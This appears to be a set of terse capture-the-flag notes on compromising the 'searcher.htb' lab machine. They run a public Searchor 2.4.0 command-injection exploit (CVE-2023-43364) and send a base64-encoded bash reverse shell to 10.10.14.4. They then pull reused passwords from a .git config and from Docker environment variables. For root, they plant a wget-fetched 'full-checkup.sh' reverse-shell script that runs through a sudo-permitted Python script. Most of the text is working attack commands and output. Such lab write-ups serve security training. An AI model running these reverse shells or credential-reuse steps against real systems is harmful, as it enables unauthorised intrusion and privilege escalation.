10.129.228.217 -> searcher.htb

found Searchor 2.4.0 in the page source of the application 

found a exploit on the following version "CVE-2023-43364-"

https://github.com/Herick-Costa/CVE-2023-43364-Searchor-RCE-Exploit 

python CVE-2023-43364.py http://searcher.htb/search -a "id"
[*] Executando comando custom: id
uid=1000(svc) gid=1000(svc) groups=1000(svc)

echo -n "bash -i >& /dev/tcp/10.10.14.4/9001 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ==

python CVE-2023-43364.py http://searcher.htb/search -a "echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ==" | base64 -d | bash"

Got the reverse shell 

found a .git in the same folder after the reverse shell by using the "ls -la"

ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Oct 29 10:21 .git

found the cred's of the current user as cody and it revels there is a another services running 

svc@busqueda:/var/www/app/.git$ ls
ls
branches        config       HEAD   index  logs     refs
COMMIT_EDITMSG  description  hooks  info   objects
svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main


By using the cred's found this 

sudo -l
[sudo] password for svc: jh1usoih2bkjaspwe92

Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

found that its runs some docker images 

sudo python3 /opt/scripts/system-checkup.py lrr
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup


after running this command 

got this info in the Gitea image "sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea"

TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gsitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh"

Connecting the the mysql using the Gitea 

mysql -h 127.0.0.1 -u gitea -pyuiu1hoiu4i5ho1uh

mysql commands 

show databases;
select database;
show tables;
select * from user;

created a file called fuul-checkup.sh

cat full-checkup.sh 
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.4/9002 0>&1'

pulled the file into the machine 

ran 

wget http://10.10.14.4:8080/full-checkup.sh
wget http://10.10.14.4:8080/full-checkup.sh
--2026-10-29 11:48:51--  http://10.10.14.4:8080/full-checkup.sh
Connecting to 10.10.14.4:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 63 [text/x-sh]
Saving to: ‘full-checkup.sh’

full-checkup.sh     100%[===================>]      63  --.-KB/s    in 0s      

2026-10-29 11:48:51 (8.15 MB/s) - ‘full-checkup.sh’ saved [63/63]

svc@busqueda:~$ ls
ls
full-checkup.sh  user.txt
svc@busqueda:~$ chmod +x full-checkup.sh
chmod +x full-checkup.sh
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
<python3 /opt/scripts/system-checkup.py full-checkup


got the root shell





